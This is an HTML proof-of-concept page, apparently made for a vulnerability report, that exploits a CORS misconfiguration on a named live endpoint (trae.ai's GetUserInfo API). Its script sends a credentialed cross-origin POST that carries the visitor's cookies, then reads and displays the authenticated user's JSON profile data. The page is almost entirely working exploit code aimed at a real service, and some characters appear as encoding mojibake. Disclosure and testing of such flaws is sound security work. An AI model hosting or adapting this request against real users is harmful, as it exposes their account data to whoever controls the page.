<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>CORS PoC â€“ Credentialed Request</title>
</head>
<body>
  <h1>CORS PoC (Authenticated JSON Response)</h1>

  <p>
    This PoC sends a <strong>credentialed cross-origin request</strong> and
    attempts to read and display the JSON response.
  </p>

  <p>
    Target endpoint:<br>
    <code>https://ug-normal.trae.ai/cloudide/api/v3/trae/GetUserInfo</code>
  </p>

  <button id="pocButton">Send Cross-Origin Request</button>

  <pre id="responseBox"
       style="border:1px solid #ccc; padding:1em; margin-top:1em; white-space:pre-wrap;">
Waiting for responseâ€¦
  </pre>

  <script>
    document.getElementById("pocButton").addEventListener("click", () => {
      fetch("https://ug-normal.trae.ai/cloudide/api/v3/trae/GetUserInfo", {
        method: "POST",
        credentials: "include", // ðŸ”‘ ensures cookies are sent
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          IfWebPage: true
        })
      })
      .then(res => {
        if (!res.ok) {
          throw new Error("HTTP status " + res.status);
        }
        return res.json();
      })
      .then(data => {
        document.getElementById("responseBox").textContent =
          JSON.stringify(data, null, 2);
        console.log("Response:", data);
      })
      .catch(err => {
        document.getElementById("responseBox").textContent =
          "Request failed:\n" + err;
        console.error(err);
      });
    });
  </script>
</body>
</html>
